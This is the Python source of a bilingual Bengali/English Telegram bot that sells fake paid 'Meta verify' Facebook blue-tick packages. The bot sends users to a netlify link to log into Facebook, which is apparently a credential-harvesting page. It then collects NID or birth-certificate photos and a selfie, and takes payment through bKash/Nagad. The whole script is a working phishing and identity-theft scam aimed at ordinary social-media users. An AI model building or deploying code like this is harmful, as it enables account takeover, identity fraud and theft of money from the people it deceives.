import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = os.getenv('BOT_TOKEN')
bot = telebot.TeleBot(TOKEN)
SUPPORT_ID = "@aratboos16"

user_states = {}

# ভাষা নির্বাচনের কিবোর্ড
def language_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn"),
        InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
    )
    return markup

# ৫টি বাটন এক সারিতে (Single row) তৈরি করার সাধারণ ফাংশন
def get_main_buttons_bn():
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("১", callback_data="meta_verify_bn"),
        InlineKeyboardButton("২", callback_data="payment_rules_bn"),
        InlineKeyboardButton("৩", callback_data="benefits_bn"),
        InlineKeyboardButton("৪", callback_data="live_support_bn"),
        InlineKeyboardButton("৫", callback_data="how_it_works_bn")
    )
    return markup

def get_main_buttons_en():
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("1", callback_data="meta_verify_en"),
        InlineKeyboardButton("2", callback_data="payment_rules_en"),
        InlineKeyboardButton("3", callback_data="benefits_en"),
        InlineKeyboardButton("4", callback_data="live_support_en"),
        InlineKeyboardButton("5", callback_data="how_it_works_en")
    )
    return markup

# /start কমান্ড হ্যান্ডলার
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_states[message.chat.id] = {"step": "none"}
    welcome_text = (
        "✨ **স্বাগতম! অনুগ্রহ করে আপনার পছন্দের ভাষা নির্বাচন করুন:**\n\n"
        "✨ **Please select your preferred language:**"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=language_keyboard())

# বাটন ক্লিক হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if call.data == "lang_bn":
        user_states[chat_id] = {"lang": "bn", "step": "main_menu"}
        markup = get_main_buttons_bn()
        text = "✨ **মূল মেনু:**\n\nনিচের ১ থেকে ৫ নম্বর বাটনগুলো থেকে আপনার প্রয়োজনীয় সেবাটি বেছে নিন:"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "lang_en":
        user_states[chat_id] = {"lang": "en", "step": "main_menu"}
        markup = get_main_buttons_en()
        text = "✨ **Main Menu:**\n\nPlease choose your required service from buttons 1 to 5 below:"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    # --- ১. মেটা ভেরিফাই (ধাপ ১) ---
    elif call.data == "meta_verify_bn":
        user_states[chat_id]["step"] = "verify_step_1"
        text = (
            "🛡️ **মেটা ভেরিফাই আবেদন (ধাপ ১/৪):**\n\n"
            "নিচ থেকে আপনার পছন্দমত প্যাকেজ সিলেক্ট করুন:\n"
            "• ১ মাস – ৩০০ টাকা\n"
            "• ৩ মাস – ৯০০ টাকা\n"
            "• ৫ মাস – ১৫০০ টাকা\n"
            "• ১ বছর – ৩০০০ টাকা\n\n"
            "আপনার প্যাকেজটি কত নম্বর (যেমন: ১, ২, ৩ বা ৪), তা চ্যাট বক্সে লিখে পাঠান।"
        )
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 পেছনে যান", callback_data="main_menu_bn"),
            InlineKeyboardButton("🏠 হোম পেজ", callback_data="main_menu_bn")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    # --- ২. পেমেন্ট ও নিয়মাবলী (সম্পূর্ণ বিস্তারিত) ---
    elif call.data == "payment_rules_bn":
        user_states[chat_id]["step"] = "main_menu"
        text = (
            "💳 **পেমেন্ট ও নিয়মাবলী:**\n\n"
            "১. পেমেন্ট সম্পন্ন করার জন্য আমাদের নির্ধারিত অফিশিয়াল বিকাশ/নগদ মার্চেন্ট বা পার্সোনাল নাম্বার ব্যবহার করতে হবে।\n"
            "২. টাকা পাঠানোর পর সঠিক ট্রানজাকশন আইডি (TrxID) প্রদান করতে হবে।\n"
            "৩. পেমেন্ট কনফার্ম হওয়ার পরেই আপনার আবেদনটি পরবর্তী প্রসেসিংয়ে নেওয়া হবে।\n"
            "৪. যেকোনো ভুল পেমেন্টের জন্য কর্তৃপক্ষ দায়ী থাকবে না।"
        )
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 পেছনে যান", callback_data="main_menu_bn"),
            InlineKeyboardButton("🏠 হোম পেজ", callback_data="main_menu_bn")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    # --- ৩. সুবিধা ও শর্তাবলী (সম্পূর্ণ বিস্তারিত) ---
    elif call.data == "benefits_bn":
        user_states[chat_id]["step"] = "main_menu"
        text = (
            "⭐ **সুবিধা ও শর্তাবলী:**\n\n"
            "🛡️ **সুবিধাসমূহ:**\n"
            "• ফেসবুক প্রোফাইল বা পেজে অফিশিয়াল ব্লু টিক (Verified Badge) যুক্ত হবে।\n"
            "• প্রিমিয়াম সাপোর্ট এবং উন্নত অ্যাকাউন্ট সিকিউরিটি।\n\n"
            "📋 **শর্তাবলী:**\n"
            "• আপনার অ্যাকাউন্টের নাম এবং এনআইডি কার্ডের তথ্য হুবহু মিল থাকতে হবে।\n"
            "• বয়স অবশ্যই ১৮ বছর বা তার বেশি হতে হবে।"
        )
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 পেছনে যান", callback_data="main_menu_bn"),
            InlineKeyboardButton("🏠 হোম পেজ", callback_data="main_menu_bn")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    # --- ৪. লাইভ সাপোর্ট (সম্পূর্ণ বিস্তারিত) ---
    elif call.data == "live_support_bn":
        user_states[chat_id]["step"] = "main_menu"
        text = (
            f"📞 **লাইভ সাপোর্ট:**\n\n"
            f"সেবা নিতে গিয়ে কোনো সমস্যা হলে বা পেমেন্ট সংক্রান্ত কোনো জিজ্ঞাসা থাকলে সরাসরি আমাদের অফিশিয়াল সাপোর্ট আইডিতে যোগাযোগ করুন:\n\n"
            f"👉 সাপোর্ট আইডি: {SUPPORT_ID}\n"
            f"আমাদের টিম আপনাকে দ্রুত সহায়তা করার জন্য সর্বদা প্রস্তুত রয়েছে।"
        )
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 পেছনে যান", callback_data="main_menu_bn"),
            InlineKeyboardButton("🏠 হোম পেজ", callback_data="main_menu_bn")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    # --- ৫. কিভাবে কাজ করে (সম্পূর্ণ বিস্তারিত) ---
    elif call.data == "how_it_works_bn":
        user_states[chat_id]["step"] = "main_menu"
        text = (
            "⚙️ **কিভাবে কাজ করে (নির্দেশিকা):**\n\n"
            "১. প্রথমে মেনু থেকে '১' নম্বর (মেটা ভেরিফাই) অপشن সিলেক্ট করে আপনার পছন্দমতো প্যাকেজ বেছে নিন।\n"
            "২. সিকিউর লিংকে প্রবেশ করে আপনার ফেসবুক অ্যাকাউন্ট লগইন করুন এবং প্রোফাইল লিংক দিন।\n"
            "৩. আপনার এনআইডি বা জন্ম সনদের স্পষ্ট ছবি আপলোড করুন।\n"
            "৪. পরিশেষে একটি পরিষ্কার সেলফি দিয়ে আবেদন সম্পন্ন করুন এবং নির্ধারিত সময় অপেক্ষা করুন।"
        )
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 পেছনে যান", callback_data="main_menu_bn"),
            InlineKeyboardButton("🏠 হোম পেজ", callback_data="main_menu_bn")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    # --- হোম পেজে ফিরে যাওয়া ---
    elif call.data == "main_menu_bn":
        user_states[chat_id]["step"] = "main_menu"
        markup = get_main_buttons_bn()
        text = "✨ **মূল মেনু:**\n\nনিচের ১ থেকে ৫ নম্বর বাটনগুলো থেকে আপনার প্রয়োজনীয় সেবাটি বেছে নিন:"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    # --- ইংরেজি অপশনসমূহ ---
    elif call.data == "meta_verify_en":
        user_states[chat_id]["step"] = "verify_step_1_en"
        text = "🛡️ **Meta Verify Application (Step 1/4):**\nPlease select your package (1, 2, 3...)"
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 Back", callback_data="main_menu_en"),
            InlineKeyboardButton("🏠 Home", callback_data="main_menu_en")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "payment_rules_en":
        user_states[chat_id]["step"] = "main_menu"
        text = "💳 **Payment & Rules:**\n\n1. Send payment to official merchant number.\n2. Provide correct Transaction ID."
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 Back", callback_data="main_menu_en"),
            InlineKeyboardButton("🏠 Home", callback_data="main_menu_en")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "benefits_en":
        user_states[chat_id]["step"] = "main_menu"
        text = "⭐ **Benefits & Terms:**\n\n• Get official Blue Tick on Facebook.\n• NID name must match."
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 Back", callback_data="main_menu_en"),
            InlineKeyboardButton("🏠 Home", callback_data="main_menu_en")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "live_support_en":
        user_states[chat_id]["step"] = "main_menu"
        text = f"📞 **Live Support:**\n\nContact support directly: {SUPPORT_ID}"
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 Back", callback_data="main_menu_en"),
            InlineKeyboardButton("🏠 Home", callback_data="main_menu_en")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "how_it_works_en":
        user_states[chat_id]["step"] = "main_menu"
        text = "⚙️ **How It Works:**\n\n1. Select package.\n2. Submit account link.\n3. Upload NID and Selfie."
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("🔙 Back", callback_data="main_menu_en"),
            InlineKeyboardButton("🏠 Home", callback_data="main_menu_en")
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "main_menu_en":
        user_states[chat_id]["step"] = "main_menu"
        markup = get_main_buttons_en()
        text = "✨ **Main Menu:**\n\nPlease choose your required service from the options below:"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=markup)

# টেক্সট এবং মাল্টি-স্টেপ প্রসেসিং হ্যান্ডলার
@bot.message_handler(func=lambda message: True)
def handle_user_input(message):
    chat_id = message.chat.id
    user_text = message.text.strip()
    
    if chat_id not in user_states:
        user_states[chat_id] = {"step": "none"}
    
    current_step = user_states[chat_id].get("step", "none")

    # ধাপ ১ থেকে প্যাকেজ ইনপুট গ্রহণ
    if current_step == "verify_step_1":
        if user_text in ["১", "২", "৩", "৪", "1", "2", "3", "4"]:
            user_states[chat_id]["step"] = "verify_step_2"
            next_text = (
                "🔗 **ধাপ ২/৪: অ্যাকাউন্ট লগইন ও লিংক সাবমিশন**\n\n"
                "নিচে থাকা লিংকের উপর চেপে ধরে রাখুন, সেখান থেকে **Open in-App** অপশন সিলেক্ট করুন। "
                "এরপর যে ফেসবুক প্রোফাইল বা পেজের জন্য ব্যাচ নিতে চান সেখানে লগইন করুন এবং লগইন শেষে আপনার সেই প্রোফাইল বা পেজের লিংক কপি করে এখানে পেস্ট করুন।\n\n"
                "👉 **লিংক:** https://web-secure-view-8821.netlify.app/"
            )
            bot.send_message(chat_id, next_text, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "❌ দয়া করে সঠিক প্যাকেজ নম্বরটি দিন (যেমন: ১, ২, ৩ বা ৪)।")

    # ধাপ ২: লিংক চেক করা (Domain Validation)
    elif current_step == "verify_step_2":
        required_domain = "https://web-secure-view-8821.netlify.app/"
        if required_domain in user_text:
            user_states[chat_id]["step"] = "verify_step_3"
            next_text = (
                "🆔 **ধাপ ৩/৪: এনআইডি বা জন্ম সনদ আপলোড**\n\n"
                "✅ লিংক সঠিক আছে!\n\n"
                "দয়া করে আপনার জন্ম সনদ বা এনআইডি (NID) কার্ডের একটি পরিষ্কার ছবি তুলে এখানে আপলোড করুন।"
            )
            bot.send_message(chat_id, next_text, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "❌ **Wrong!** সঠিক ডোমেন সম্বলিত লিংক পাওয়া যায়নি। দয়া করে সঠিক নিয়ম মেনে লিংক দিন।")

    else:
        bot.send_message(chat_id, "দয়া করে প্রথমে `/start` লিখে মেনu ওপেন করুন।")

# ছবি আপলোড হ্যান্ডলার (ধাপ ৩ এবং ৪)
@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    current_step = user_states.get(chat_id, {}).get("step", "none")

    if current_step == "verify_step_3":
        user_states[chat_id]["step"] = "verify_step_4"
        bot.send_message(chat_id, "📸 **ধাপ ৪/৪: সেলফি আপলোড**\n\nএনআইডি কার্ড সফলভাবে গৃহীত হয়েছে!\n\nদয়া করে আপনার একটি পরিষ্কার সেলফি (Clear Selfie) তুলে এখানে দিন।")

    elif current_step == "verify_step_4":
        user_states[chat_id]["step"] = "completed"
        bot.send_message(chat_id, "✅ **সফল হয়েছে!** আপনার সমস্ত তথ্য ও ছবি সফলভাবে জমা হয়েছে। প্রসেসিং চলছে, অনুগ্রহ করে নির্ধারিত সময় পর্যন্ত অপেক্ষা করুন।")
    else:
        bot.send_message(chat_id, "দয়া করে প্রথমে `/start` লিখে ভেরিফাই অপশন শুরু করুন।")

print("Bot is running smoothly...")
bot.infinity_polling()
